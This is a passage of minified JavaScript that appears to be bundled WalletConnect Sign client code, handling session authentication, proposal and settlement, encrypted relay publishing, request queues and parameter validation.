            const T = await this.client.core.crypto.generateSharedKey(f, l);
            n.addTrace(Cl.create_authenticated_session_topic);
            let x;
            if ((b == null ? void 0 : b.length) > 0) {
                x = {
                    topic: T,
                    acknowledged: !0,
                    self: {
                        publicKey: f,
                        metadata: this.client.metadata
                    },
                    peer: {
                        publicKey: l,
                        metadata: s.requester.metadata
                    },
                    controller: l,
                    expiry: yn(vf),
                    authentication: i,
                    requiredNamespaces: {},
                    optionalNamespaces: {},
                    relay: {
                        protocol: "irn"
                    },
                    pairingTopic: s.pairingTopic,
                    namespaces: d_([...new Set(b)], [...new Set(v)]),
                    transportType: a
                },
                n.addTrace(Cl.subscribing_authenticated_session_topic);
                try {
                    await this.client.core.relayer.subscribe(T, {
                        transportType: a
                    })
                } catch (E) {
                    throw n.setError(bp.subscribe_authenticated_session_topic_failure),
                    E
                }
                n.addTrace(Cl.subscribe_authenticated_session_topic_success),
                await this.client.session.set(T, x),
                n.addTrace(Cl.store_authenticated_session),
                await this.client.core.pairing.updateMetadata({
                    topic: s.pairingTopic,
                    metadata: s.requester.metadata
                })
            }
            n.addTrace(Cl.publishing_authenticated_session_approve);
            try {
                await this.sendResult({
                    topic: h,
                    id: o,
                    result: {
                        cacaos: i,
                        responder: {
                            publicKey: f,
                            metadata: this.client.metadata
                        }
                    },
                    encodeOpts: p,
                    throwOnFailedPublish: !0,
                    appLink: this.getAppLinkIfEnabled(s.requester.metadata, a)
                })
            } catch (E) {
                throw n.setError(bp.authenticated_session_approve_publish_failure),
                E
            }
            return await this.client.auth.requests.delete(o, {
                message: "fulfilled",
                code: 0
            }),
            await this.client.core.pairing.activate({
                topic: s.pairingTopic
            }),
            this.client.core.eventClient.deleteEvent({
                eventId: n.eventId
            }),
            {
                session: x
            }
        }
        ),
        qe(this, "rejectSessionAuthenticate", async t => {
            this.isInitialized();
            const {id: o, reason: i} = t
              , n = this.getPendingAuthRequest(o);
            if (!n)
                throw new Error(`Could not find pending auth request with id ${o}`);
            n.transportType === kr.relay && await this.confirmOnlineStateOrThrow();
            const s = n.requester.publicKey
              , a = await this.client.core.crypto.generateKeyPair()
              , l = Em(s)
              , f = {
                type: ja,
                receiverPublicKey: s,
                senderPublicKey: a
            };
            await this.sendError({
                id: o,
                topic: l,
                error: i,
                encodeOpts: f,
                rpcOpts: An.wc_sessionAuthenticate.reject,
                appLink: this.getAppLinkIfEnabled(n.requester.metadata, n.transportType)
            }),
            await this.client.auth.requests.delete(o, {
                message: "rejected",
                code: 0
            }),
            await this.client.proposal.delete(o, Nr("USER_DISCONNECTED"))
        }
        ),
        qe(this, "formatAuthMessage", t => {
            this.isInitialized();
            const {request: o, iss: i} = t;
            return IN(o, i)
        }
        ),
        qe(this, "processRelayMessageCache", () => {
            setTimeout(async () => {
                if (this.relayMessageCache.length !== 0)
                    for (; this.relayMessageCache.length > 0; )
                        try {
                            const t = this.relayMessageCache.shift();
                            t && await this.onRelayMessage(t)
                        } catch (t) {
                            this.client.logger.error(t)
                        }
            }
            , 50)
        }
        ),
        qe(this, "cleanupDuplicatePairings", async t => {
            if (t.pairingTopic)
                try {
                    const o = this.client.core.pairing.pairings.get(t.pairingTopic)
                      , i = this.client.core.pairing.pairings.getAll().filter(n => {
                        var s, a;
                        return ((s = n.peerMetadata) == null ? void 0 : s.url) && ((a = n.peerMetadata) == null ? void 0 : a.url) === t.peer.metadata.url && n.topic && n.topic !== o.topic
                    }
                    );
                    if (i.length === 0)
                        return;
                    this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),
                    await Promise.all(i.map(n => this.client.core.pairing.disconnect({
                        topic: n.topic
                    }))),
                    this.client.logger.info("Duplicate pairings clean up finished")
                } catch (o) {
                    this.client.logger.error(o)
                }
        }
        ),
        qe(this, "deleteSession", async t => {
            var o;
            const {topic: i, expirerHasDeleted: n=!1, emitEvent: s=!0, id: a=0} = t
              , {self: l} = this.client.session.get(i);
            await this.client.core.relayer.unsubscribe(i),
            await this.client.session.delete(i, Nr("USER_DISCONNECTED")),
            this.addToRecentlyDeleted(i, "session"),
            this.client.core.crypto.keychain.has(l.publicKey) && await this.client.core.crypto.deleteKeyPair(l.publicKey),
            this.client.core.crypto.keychain.has(i) && await this.client.core.crypto.deleteSymKey(i),
            n || this.client.core.expirer.del(i),
            this.client.core.storage.removeItem(Z_).catch(f => this.client.logger.warn(f)),
            this.getPendingSessionRequests().forEach(f => {
                f.topic === i && this.deletePendingSessionRequest(f.id, Nr("USER_DISCONNECTED"))
            }
            ),
            i === ((o = this.sessionRequestQueue.queue[0]) == null ? void 0 : o.topic) && (this.sessionRequestQueue.state = _s.idle),
            s && this.client.events.emit("session_delete", {
                id: a,
                topic: i
            })
        }
        ),
        qe(this, "deleteProposal", async (t, o) => {
            if (o)
                try {
                    const i = this.client.proposal.get(t)
                      , n = this.client.core.eventClient.getEvent({
                        topic: i.pairingTopic
                    });
                    n == null || n.setError(Pl.proposal_expired)
                } catch {}
            await Promise.all([this.client.proposal.delete(t, Nr("USER_DISCONNECTED")), o ? Promise.resolve() : this.client.core.expirer.del(t)]),
            this.addToRecentlyDeleted(t, "proposal")
        }
        ),
        qe(this, "deletePendingSessionRequest", async (t, o, i=!1) => {
            await Promise.all([this.client.pendingRequest.delete(t, o), i ? Promise.resolve() : this.client.core.expirer.del(t)]),
            this.addToRecentlyDeleted(t, "request"),
            this.sessionRequestQueue.queue = this.sessionRequestQueue.queue.filter(n => n.id !== t),
            i && (this.sessionRequestQueue.state = _s.idle,
            this.client.events.emit("session_request_expire", {
                id: t
            }))
        }
        ),
        qe(this, "deletePendingAuthRequest", async (t, o, i=!1) => {
            await Promise.all([this.client.auth.requests.delete(t, o), i ? Promise.resolve() : this.client.core.expirer.del(t)])
        }
        ),
        qe(this, "setExpiry", async (t, o) => {
            this.client.session.keys.includes(t) && (this.client.core.expirer.set(t, o),
            await this.client.session.update(t, {
                expiry: o
            }))
        }
        ),
        qe(this, "setProposal", async (t, o) => {
            this.client.core.expirer.set(t, yn(An.wc_sessionPropose.req.ttl)),
            await this.client.proposal.set(t, o)
        }
        ),
        qe(this, "setAuthRequest", async (t, o) => {
            const {request: i, pairingTopic: n, transportType: s=kr.relay} = o;
            this.client.core.expirer.set(t, i.expiryTimestamp),
            await this.client.auth.requests.set(t, {
                authPayload: i.authPayload,
                requester: i.requester,
                expiryTimestamp: i.expiryTimestamp,
                id: t,
                pairingTopic: n,
                verifyContext: i.verifyContext,
                transportType: s
            })
        }
        ),
        qe(this, "setPendingSessionRequest", async t => {
            const {id: o, topic: i, params: n, verifyContext: s} = t
              , a = n.request.expiryTimestamp || yn(An.wc_sessionRequest.req.ttl);
            this.client.core.expirer.set(o, a),
            await this.client.pendingRequest.set(o, {
                id: o,
                topic: i,
                params: n,
                verifyContext: s
            })
        }
        ),
        qe(this, "sendRequest", async t => {
            const {topic: o, method: i, params: n, expiry: s, relayRpcId: a, clientRpcId: l, throwOnFailedPublish: f, appLink: h, tvf: p} = t
              , b = jl(i, n, l);
            let v;
            const T = !!h;
            try {
                const B = T ? Nc : as;
                v = await this.client.core.crypto.encode(o, b, {
                    encoding: B
                })
            } catch (B) {
                throw await this.cleanup(),
                this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${o} failed`),
                B
            }
            let x;
            if (rce.includes(i)) {
                const B = js(JSON.stringify(b))
                  , P = js(v);
                x = await this.client.core.verify.register({
                    id: P,
                    decryptedId: B
                })
            }
            const E = An[i].req;
            if (E.attestation = x,
            s && (E.ttl = s),
            a && (E.id = a),
            this.client.core.history.set(o, b),
            T) {
                const B = hy(h, o, v);
                await global.Linking.openURL(B, this.client.name)
            } else {
                const B = An[i].req;
                s && (B.ttl = s),
                a && (B.id = a),
                B.tvf = so(Mr({}, p), {
                    correlationId: b.id
                }),
                f ? (B.internal = so(Mr({}, B.internal), {
                    throwOnFailedPublish: !0
                }),
                await this.client.core.relayer.publish(o, v, B)) : this.client.core.relayer.publish(o, v, B).catch(P => this.client.logger.error(P))
            }
            return b.id
        }
        ),
        qe(this, "sendResult", async t => {
            const {id: o, topic: i, result: n, throwOnFailedPublish: s, encodeOpts: a, appLink: l} = t
              , f = N3(o, n);
            let h;
            const p = l && typeof (global == null ? void 0 : global.Linking) < "u";
            try {
                const T = p ? Nc : as;
                h = await this.client.core.crypto.encode(i, f, so(Mr({}, a || {}), {
                    encoding: T
                }))
            } catch (T) {
                throw await this.cleanup(),
                this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),
                T
            }
            let b, v;
            try {
                b = await this.client.core.history.get(i, o);
                const T = b.request;
                try {
                    this.shouldSetTVF(T.method, T.params) && (v = this.getTVFParams(o, T.params, n))
                } catch (x) {
                    this.client.logger.warn("sendResult() -> getTVFParams() failed", x)
                }
            } catch (T) {
                throw this.client.logger.error(`sendResult() -> history.get(${i}, ${o}) failed`),
                T
            }
            if (p) {
                const T = hy(l, i, h);
                await global.Linking.openURL(T, this.client.name)
            } else {
                const T = b.request.method
                  , x = An[T].res;
                x.tvf = so(Mr({}, v), {
                    correlationId: o
                }),
                s ? (x.internal = so(Mr({}, x.internal), {
                    throwOnFailedPublish: !0
                }),
                await this.client.core.relayer.publish(i, h, x)) : this.client.core.relayer.publish(i, h, x).catch(E => this.client.logger.error(E))
            }
            await this.client.core.history.resolve(f)
        }
        ),
        qe(this, "sendError", async t => {
            const {id: o, topic: i, error: n, encodeOpts: s, rpcOpts: a, appLink: l} = t
              , f = D3(o, n);
            let h;
            const p = l && typeof (global == null ? void 0 : global.Linking) < "u";
            try {
                const v = p ? Nc : as;
                h = await this.client.core.crypto.encode(i, f, so(Mr({}, s || {}), {
                    encoding: v
                }))
            } catch (v) {
                throw await this.cleanup(),
                this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),
                v
            }
            let b;
            try {
                b = await this.client.core.history.get(i, o)
            } catch (v) {
                throw this.client.logger.error(`sendError() -> history.get(${i}, ${o}) failed`),
                v
            }
            if (p) {
                const v = hy(l, i, h);
                await global.Linking.openURL(v, this.client.name)
            } else {
                const v = b.request.method
                  , T = a || An[v].res;
                this.client.core.relayer.publish(i, h, T)
            }
            await this.client.core.history.resolve(f)
        }
        ),
        qe(this, "cleanup", async () => {
            const t = []
              , o = [];
            this.client.session.getAll().forEach(i => {
                let n = !1;
                Wc(i.expiry) && (n = !0),
                this.client.core.crypto.keychain.has(i.topic) || (n = !0),
                n && t.push(i.topic)
            }
            ),
            this.client.proposal.getAll().forEach(i => {
                Wc(i.expiryTimestamp) && o.push(i.id)
            }
            ),
            await Promise.all([...t.map(i => this.deleteSession({
                topic: i
            })), ...o.map(i => this.deleteProposal(i))])
        }
        ),
        qe(this, "onProviderMessageEvent", async t => {
            !this.initialized || this.relayMessageCache.length > 0 ? this.relayMessageCache.push(t) : await this.onRelayMessage(t)
        }
        ),
        qe(this, "onRelayEventRequest", async t => {
            this.requestQueue.queue.push(t),
            await this.processRequestsQueue()
        }
        ),
        qe(this, "processRequestsQueue", async () => {
            if (this.requestQueue.state === _s.active) {
                this.client.logger.info("Request queue already active, skipping...");
                return
            }
            for (this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`); this.requestQueue.queue.length > 0; ) {
                this.requestQueue.state = _s.active;
                const t = this.requestQueue.queue.shift();
                if (t)
                    try {
                        await this.processRequest(t)
                    } catch (o) {
                        this.client.logger.warn(o)
                    }
            }
            this.requestQueue.state = _s.idle
        }
        ),
        qe(this, "processRequest", async t => {
            const {topic: o, payload: i, attestation: n, transportType: s, encryptedId: a} = t
              , l = i.method;
            if (!this.shouldIgnorePairingRequest({
                topic: o,
                requestMethod: l
            }))
                switch (l) {
                case "wc_sessionPropose":
                    return await this.onSessionProposeRequest({
                        topic: o,
                        payload: i,
                        attestation: n,
                        encryptedId: a
                    });
                case "wc_sessionSettle":
                    return await this.onSessionSettleRequest(o, i);
                case "wc_sessionUpdate":
                    return await this.onSessionUpdateRequest(o, i);
                case "wc_sessionExtend":
                    return await this.onSessionExtendRequest(o, i);
                case "wc_sessionPing":
                    return await this.onSessionPingRequest(o, i);
                case "wc_sessionDelete":
                    return await this.onSessionDeleteRequest(o, i);
                case "wc_sessionRequest":
                    return await this.onSessionRequest({
                        topic: o,
                        payload: i,
                        attestation: n,
                        encryptedId: a,
                        transportType: s
                    });
                case "wc_sessionEvent":
                    return await this.onSessionEventRequest(o, i);
                case "wc_sessionAuthenticate":
                    return await this.onSessionAuthenticateRequest({
                        topic: o,
                        payload: i,
                        attestation: n,
                        encryptedId: a,
                        transportType: s
                    });
                default:
                    return this.client.logger.info(`Unsupported request method ${l}`)
                }
        }
        ),
        qe(this, "onRelayEventResponse", async t => {
            const {topic: o, payload: i, transportType: n} = t
              , s = (await this.client.core.history.get(o, i.id)).request.method;
            switch (s) {
            case "wc_sessionPropose":
                return this.onSessionProposeResponse(o, i, n);
            case "wc_sessionSettle":
                return this.onSessionSettleResponse(o, i);
            case "wc_sessionUpdate":
                return this.onSessionUpdateResponse(o, i);
            case "wc_sessionExtend":
                return this.onSessionExtendResponse(o, i);
            case "wc_sessionPing":
                return this.onSessionPingResponse(o, i);
            case "wc_sessionRequest":
                return this.onSessionRequestResponse(o, i);
            case "wc_sessionAuthenticate":
                return this.onSessionAuthenticateResponse(o, i);
            default:
                return this.client.logger.info(`Unsupported response method ${s}`)
            }
        }
        ),
        qe(this, "onRelayEventUnknownPayload", t => {
            const {topic: o} = t
              , {message: i} = Xe("MISSING_OR_INVALID", `Decoded payload on topic ${o} is not identifiable as a JSON-RPC request or a response.`);
            throw new Error(i)
        }
        ),
        qe(this, "shouldIgnorePairingRequest", t => {
            const {topic: o, requestMethod: i} = t
              , n = this.expectedPairingMethodMap.get(o);
            return !n || n.includes(i) ? !1 : !!(n.includes("wc_sessionAuthenticate") && this.client.events.listenerCount("session_authenticate") > 0)
        }
        ),
        qe(this, "onSessionProposeRequest", async t => {
            const {topic: o, payload: i, attestation: n, encryptedId: s} = t
              , {params: a, id: l} = i;
            try {
                const f = this.client.core.eventClient.getEvent({
                    topic: o
                });
                this.client.events.listenerCount("session_proposal") === 0 && (console.warn("No listener for session_proposal event"),
                f == null || f.setError(Aa.proposal_listener_not_found)),
                this.isValidConnect(Mr({}, i.params));
                const h = a.expiryTimestamp || yn(An.wc_sessionPropose.req.ttl)
                  , p = Mr({
                    id: l,
                    pairingTopic: o,
                    expiryTimestamp: h
                }, a);
                await this.setProposal(l, p);
                const b = await this.getVerifyContext({
                    attestationId: n,
                    hash: js(JSON.stringify(i)),
                    encryptedId: s,
                    metadata: p.proposer.metadata
                });
                f == null || f.addTrace(Ws.emit_session_proposal),
                this.client.events.emit("session_proposal", {
                    id: l,
                    params: p,
                    verifyContext: b
                })
            } catch (f) {
                await this.sendError({
                    id: l,
                    topic: o,
                    error: f,
                    rpcOpts: An.wc_sessionPropose.autoReject
                }),
                this.client.logger.error(f)
            }
        }
        ),
        qe(this, "onSessionProposeResponse", async (t, o, i) => {
            const {id: n} = o;
            if (Ds(o)) {
                const {result: s} = o;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    result: s
                });
                const a = this.client.proposal.get(n);
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    proposal: a
                });
                const l = a.proposer.publicKey;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    selfPublicKey: l
                });
                const f = s.responderPublicKey;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    peerPublicKey: f
                });
                const h = await this.client.core.crypto.generateSharedKey(l, f);
                this.pendingSessions.set(n, {
                    sessionTopic: h,
                    pairingTopic: t,
                    proposalId: n,
                    publicKey: l
                });
                const p = await this.client.core.relayer.subscribe(h, {
                    transportType: i
                });
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    subscriptionId: p
                }),
                await this.client.core.pairing.activate({
                    topic: t
                })
            } else if (Ni(o)) {
                await this.client.proposal.delete(n, Nr("USER_DISCONNECTED"));
                const s = wr("session_connect", n);
                if (this.events.listenerCount(s) === 0)
                    throw new Error(`emitting ${s} without any listeners, 954`);
                this.events.emit(s, {
                    error: o.error
                })
            }
        }
        ),
        qe(this, "onSessionSettleRequest", async (t, o) => {
            const {id: i, params: n} = o;
            try {
                this.isValidSessionSettleRequest(n);
                const {relay: s, controller: a, expiry: l, namespaces: f, sessionProperties: h, scopedProperties: p, sessionConfig: b} = o.params
                  , v = [...this.pendingSessions.values()].find(E => E.sessionTopic === t);
                if (!v)
                    return this.client.logger.error(`Pending session not found for topic ${t}`);
                const T = this.client.proposal.get(v.proposalId)
                  , x = so(Mr(Mr(Mr({
                    topic: t,
                    relay: s,
                    expiry: l,
                    namespaces: f,
                    acknowledged: !0,
                    pairingTopic: v.pairingTopic,
                    requiredNamespaces: T.requiredNamespaces,
                    optionalNamespaces: T.optionalNamespaces,
                    controller: a.publicKey,
                    self: {
                        publicKey: v.publicKey,
                        metadata: this.client.metadata
                    },
                    peer: {
                        publicKey: a.publicKey,
                        metadata: a.metadata
                    }
                }, h && {
                    sessionProperties: h
                }), p && {
                    scopedProperties: p
                }), b && {
                    sessionConfig: b
                }), {
                    transportType: kr.relay
                });
                await this.client.session.set(x.topic, x),
                await this.setExpiry(x.topic, x.expiry),
                await this.client.core.pairing.updateMetadata({
                    topic: v.pairingTopic,
                    metadata: x.peer.metadata
                }),
                this.client.events.emit("session_connect", {
                    session: x
                }),
                this.events.emit(wr("session_connect", v.proposalId), {
                    session: x
                }),
                this.pendingSessions.delete(v.proposalId),
                this.deleteProposal(v.proposalId, !1),
                this.cleanupDuplicatePairings(x),
                await this.sendResult({
                    id: o.id,
                    topic: t,
                    result: !0,
                    throwOnFailedPublish: !0
                })
            } catch (s) {
                await this.sendError({
                    id: i,
                    topic: t,
                    error: s
                }),
                this.client.logger.error(s)
            }
        }
        ),
        qe(this, "onSessionSettleResponse", async (t, o) => {
            const {id: i} = o;
            Ds(o) ? (await this.client.session.update(t, {
                acknowledged: !0
            }),
            this.events.emit(wr("session_approve", i), {})) : Ni(o) && (await this.client.session.delete(t, Nr("USER_DISCONNECTED")),
            this.events.emit(wr("session_approve", i), {
                error: o.error
            }))
        }
        ),
        qe(this, "onSessionUpdateRequest", async (t, o) => {
            const {params: i, id: n} = o;
            try {
                const s = `${t}_session_update`
                  , a = gp.get(s);
                if (a && this.isRequestOutOfSync(a, n)) {
                    this.client.logger.warn(`Discarding out of sync request - ${n}`),
                    this.sendError({
                        id: n,
                        topic: t,
                        error: Nr("INVALID_UPDATE_REQUEST")
                    });
                    return
                }
                this.isValidUpdate(Mr({
                    topic: t
                }, i));
                try {
                    gp.set(s, n),
                    await this.client.session.update(t, {
                        namespaces: i.namespaces
                    }),
                    await this.sendResult({
                        id: n,
                        topic: t,
                        result: !0,
                        throwOnFailedPublish: !0
                    })
                } catch (l) {
                    throw gp.delete(s),
                    l
                }
                this.client.events.emit("session_update", {
                    id: n,
                    topic: t,
                    params: i
                })
            } catch (s) {
                await this.sendError({
                    id: n,
                    topic: t,
                    error: s
                }),
                this.client.logger.error(s)
            }
        }
        ),
        qe(this, "isRequestOutOfSync", (t, o) => o.toString().slice(0, -3) < t.toString().slice(0, -3)),
        qe(this, "onSessionUpdateResponse", (t, o) => {
            const {id: i} = o
              , n = wr("session_update", i);
            if (this.events.listenerCount(n) === 0)
                throw new Error(`emitting ${n} without any listeners`);
            Ds(o) ? this.events.emit(wr("session_update", i), {}) : Ni(o) && this.events.emit(wr("session_update", i), {
                error: o.error
            })
        }
        ),
        qe(this, "onSessionExtendRequest", async (t, o) => {
            const {id: i} = o;
            try {
                this.isValidExtend({
                    topic: t
                }),
                await this.setExpiry(t, yn(vf)),
                await this.sendResult({
                    id: i,
                    topic: t,
                    result: !0,
                    throwOnFailedPublish: !0
                }),
                this.client.events.emit("session_extend", {
                    id: i,
                    topic: t
                })
            } catch (n) {
                await this.sendError({
                    id: i,
                    topic: t,
                    error: n
                }),
                this.client.logger.error(n)
            }
        }
        ),
        qe(this, "onSessionExtendResponse", (t, o) => {
            const {id: i} = o
              , n = wr("session_extend", i);
            if (this.events.listenerCount(n) === 0)
                throw new Error(`emitting ${n} without any listeners`);
            Ds(o) ? this.events.emit(wr("session_extend", i), {}) : Ni(o) && this.events.emit(wr("session_extend", i), {
                error: o.error
            })
        }
        ),
        qe(this, "onSessionPingRequest", async (t, o) => {
            const {id: i} = o;
            try {
                this.isValidPing({
                    topic: t
                }),
                await this.sendResult({
                    id: i,
                    topic: t,
                    result: !0,
                    throwOnFailedPublish: !0
                }),
                this.client.events.emit("session_ping", {
                    id: i,
                    topic: t
                })
            } catch (n) {
                await this.sendError({
                    id: i,
                    topic: t,
                    error: n
                }),
                this.client.logger.error(n)
            }
        }
        ),
        qe(this, "onSessionPingResponse", (t, o) => {
            const {id: i} = o
              , n = wr("session_ping", i);
            setTimeout( () => {
                if (this.events.listenerCount(n) === 0)
                    throw new Error(`emitting ${n} without any listeners 2176`);
                Ds(o) ? this.events.emit(wr("session_ping", i), {}) : Ni(o) && this.events.emit(wr("session_ping", i), {
                    error: o.error
                })
            }
            , 500)
        }
        ),
        qe(this, "onSessionDeleteRequest", async (t, o) => {
            const {id: i} = o;
            try {
                this.isValidDisconnect({
                    topic: t,
                    reason: o.params
                }),
                Promise.all([new Promise(n => {
                    this.client.core.relayer.once(Bn.publish, async () => {
                        n(await this.deleteSession({
                            topic: t,
                            id: i
                        }))
                    }
                    )
                }
                ), this.sendResult({
                    id: i,
                    topic: t,
                    result: !0,
                    throwOnFailedPublish: !0
                }), this.cleanupPendingSentRequestsForTopic({
                    topic: t,
                    error: Nr("USER_DISCONNECTED")
                })]).catch(n => this.client.logger.error(n))
            } catch (n) {
                this.client.logger.error(n)
            }
        }
        ),
        qe(this, "onSessionRequest", async t => {
            var o, i, n;
            const {topic: s, payload: a, attestation: l, encryptedId: f, transportType: h} = t
              , {id: p, params: b} = a;
            try {
                await this.isValidRequest(Mr({
                    topic: s
                }, b));
                const v = this.client.session.get(s)
                  , T = await this.getVerifyContext({
                    attestationId: l,
                    hash: js(JSON.stringify(jl("wc_sessionRequest", b, p))),
                    encryptedId: f,
                    metadata: v.peer.metadata,
                    transportType: h
                })
                  , x = {
                    id: p,
                    topic: s,
                    params: b,
                    verifyContext: T
                };
                await this.setPendingSessionRequest(x),
                h === kr.link_mode && (o = v.peer.metadata.redirect) != null && o.universal && this.client.core.addLinkModeSupportedApp((i = v.peer.metadata.redirect) == null ? void 0 : i.universal),
                (n = this.client.signConfig) != null && n.disableRequestQueue ? this.emitSessionRequest(x) : (this.addSessionRequestToSessionRequestQueue(x),
                this.processSessionRequestQueue())
            } catch (v) {
                await this.sendError({
                    id: p,
                    topic: s,
                    error: v
                }),
                this.client.logger.error(v)
            }
        }
        ),
        qe(this, "onSessionRequestResponse", (t, o) => {
            const {id: i} = o
              , n = wr("session_request", i);
            if (this.events.listenerCount(n) === 0)
                throw new Error(`emitting ${n} without any listeners`);
            Ds(o) ? this.events.emit(wr("session_request", i), {
                result: o.result
            }) : Ni(o) && this.events.emit(wr("session_request", i), {
                error: o.error
            })
        }
        ),
        qe(this, "onSessionEventRequest", async (t, o) => {
            const {id: i, params: n} = o;
            try {
                const s = `${t}_session_event_${n.event.name}`
                  , a = gp.get(s);
                if (a && this.isRequestOutOfSync(a, i)) {
                    this.client.logger.info(`Discarding out of sync request - ${i}`);
                    return
                }
                this.isValidEmit(Mr({
                    topic: t
                }, n)),
                this.client.events.emit("session_event", {
                    id: i,
                    topic: t,
                    params: n
                }),
                gp.set(s, i)
            } catch (s) {
                await this.sendError({
                    id: i,
                    topic: t,
                    error: s
                }),
                this.client.logger.error(s)
            }
        }
        ),
        qe(this, "onSessionAuthenticateResponse", (t, o) => {
            const {id: i} = o;
            this.client.logger.trace({
                type: "method",
                method: "onSessionAuthenticateResponse",
                topic: t,
                payload: o
            }),
            Ds(o) ? this.events.emit(wr("session_request", i), {
                result: o.result
            }) : Ni(o) && this.events.emit(wr("session_request", i), {
                error: o.error
            })
        }
        ),
        qe(this, "onSessionAuthenticateRequest", async t => {
            var o;
            const {topic: i, payload: n, attestation: s, encryptedId: a, transportType: l} = t;
            try {
                const {requester: f, authPayload: h, expiryTimestamp: p} = n.params
                  , b = await this.getVerifyContext({
                    attestationId: s,
                    hash: js(JSON.stringify(n)),
                    encryptedId: a,
                    metadata: f.metadata,
                    transportType: l
                })
                  , v = {
                    requester: f,
                    pairingTopic: i,
                    id: n.id,
                    authPayload: h,
                    verifyContext: b,
                    expiryTimestamp: p
                };
                await this.setAuthRequest(n.id, {
                    request: v,
                    pairingTopic: i,
                    transportType: l
                }),
                l === kr.link_mode && (o = f.metadata.redirect) != null && o.universal && this.client.core.addLinkModeSupportedApp(f.metadata.redirect.universal),
                this.client.events.emit("session_authenticate", {
                    topic: i,
                    params: n.params,
                    id: n.id,
                    verifyContext: b
                })
            } catch (f) {
                this.client.logger.error(f);
                const h = n.params.requester.publicKey
                  , p = await this.client.core.crypto.generateKeyPair()
                  , b = this.getAppLinkIfEnabled(n.params.requester.metadata, l)
                  , v = {
                    type: ja,
                    receiverPublicKey: h,
                    senderPublicKey: p
                };
                await this.sendError({
                    id: n.id,
                    topic: i,
                    error: f,
                    encodeOpts: v,
                    rpcOpts: An.wc_sessionAuthenticate.autoReject,
                    appLink: b
                })
            }
        }
        ),
        qe(this, "addSessionRequestToSessionRequestQueue", t => {
            this.sessionRequestQueue.queue.push(t)
        }
        ),
        qe(this, "cleanupAfterResponse", t => {
            this.deletePendingSessionRequest(t.response.id, {
                message: "fulfilled",
                code: 0
            }),
            setTimeout( () => {
                this.sessionRequestQueue.state = _s.idle,
                this.processSessionRequestQueue()
            }
            , Ze.toMiliseconds(this.requestQueueDelay))
        }
        ),
        qe(this, "cleanupPendingSentRequestsForTopic", ({topic: t, error: o}) => {
            const i = this.client.core.history.pending;
            i.length > 0 && i.filter(n => n.topic === t && n.request.method === "wc_sessionRequest").forEach(n => {
                const s = n.request.id
                  , a = wr("session_request", s);
                if (this.events.listenerCount(a) === 0)
                    throw new Error(`emitting ${a} without any listeners`);
                this.events.emit(wr("session_request", n.request.id), {
                    error: o
                })
            }
            )
        }
        ),
        qe(this, "processSessionRequestQueue", () => {
            if (this.sessionRequestQueue.state === _s.active) {
                this.client.logger.info("session request queue is already active.");
                return
            }
            const t = this.sessionRequestQueue.queue[0];
            if (!t) {
                this.client.logger.info("session request queue is empty.");
                return
            }
            try {
                this.sessionRequestQueue.state = _s.active,
                this.emitSessionRequest(t)
            } catch (o) {
                this.client.logger.error(o)
            }
        }
        ),
        qe(this, "emitSessionRequest", t => {
            this.client.events.emit("session_request", t)
        }
        ),
        qe(this, "onPairingCreated", t => {
            if (t.methods && this.expectedPairingMethodMap.set(t.topic, t.methods),
            t.active)
                return;
            const o = this.client.proposal.getAll().find(i => i.pairingTopic === t.topic);
            o && this.onSessionProposeRequest({
                topic: t.topic,
                payload: jl("wc_sessionPropose", so(Mr({}, o), {
                    requiredNamespaces: o.requiredNamespaces,
                    optionalNamespaces: o.optionalNamespaces,
                    relays: o.relays,
                    proposer: o.proposer,
                    sessionProperties: o.sessionProperties,
                    scopedProperties: o.scopedProperties
                }), o.id)
            })
        }
        ),
        qe(this, "isValidConnect", async t => {
            if (!Io(t)) {
                const {message: f} = Xe("MISSING_OR_INVALID", `connect() params: ${JSON.stringify(t)}`);
                throw new Error(f)
            }
            const {pairingTopic: o, requiredNamespaces: i, optionalNamespaces: n, sessionProperties: s, scopedProperties: a, relays: l} = t;
            if (zn(o) || await this.isValidPairingTopic(o),
            !Sne(l)) {
                const {message: f} = Xe("MISSING_OR_INVALID", `connect() relays: ${l}`);
                throw new Error(f)
            }
            if (!zn(i) && Zp(i) !== 0) {
                const f = "requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";
                ["fatal", "error", "silent"].includes(this.client.logger.level) ? console.warn(f) : this.client.logger.warn(f),
                this.validateNamespaces(i, "requiredNamespaces")
            }
            if (!zn(n) && Zp(n) !== 0 && this.validateNamespaces(n, "optionalNamespaces"),
            zn(s) || this.validateSessionProps(s, "sessionProperties"),
            !zn(a)) {
                this.validateSessionProps(a, "scopedProperties");
                const f = Object.keys(i || {}).concat(Object.keys(n || {}));
                if (!Object.keys(a).every(h => f.includes(h)))
                    throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(f)}`)
            }
        }
        ),
        qe(this, "validateNamespaces", (t, o) => {
            const i = Cne(t, "connect()", o);
            if (i)
                throw new Error(i.message)
        }
        ),
        qe(this, "isValidApprove", async t => {
            if (!Io(t))
                throw new Error(Xe("MISSING_OR_INVALID", `approve() params: ${t}`).message);
            const {id: o, namespaces: i, relayProtocol: n, sessionProperties: s, scopedProperties: a} = t;
            this.checkRecentlyDeleted(o),
            await this.isValidProposalId(o);
            const l = this.client.proposal.get(o)
              , f = w2(i, "approve()");
            if (f)
                throw new Error(f.message);
            const h = g_(l.requiredNamespaces, i, "approve()");
            if (h)
                throw new Error(h.message);
            if (!un(n, !0)) {
                const {message: p} = Xe("MISSING_OR_INVALID", `approve() relayProtocol: ${n}`);
                throw new Error(p)
            }
            if (zn(s) || this.validateSessionProps(s, "sessionProperties"),
            !zn(a)) {
                this.validateSessionProps(a, "scopedProperties");
                const p = new Set(Object.keys(i));
                if (!Object.keys(a).every(b => p.has(b)))
                    throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(p).join(", ")}`)
            }
        }
        ),
        qe(this, "isValidReject", async t => {
            if (!Io(t)) {
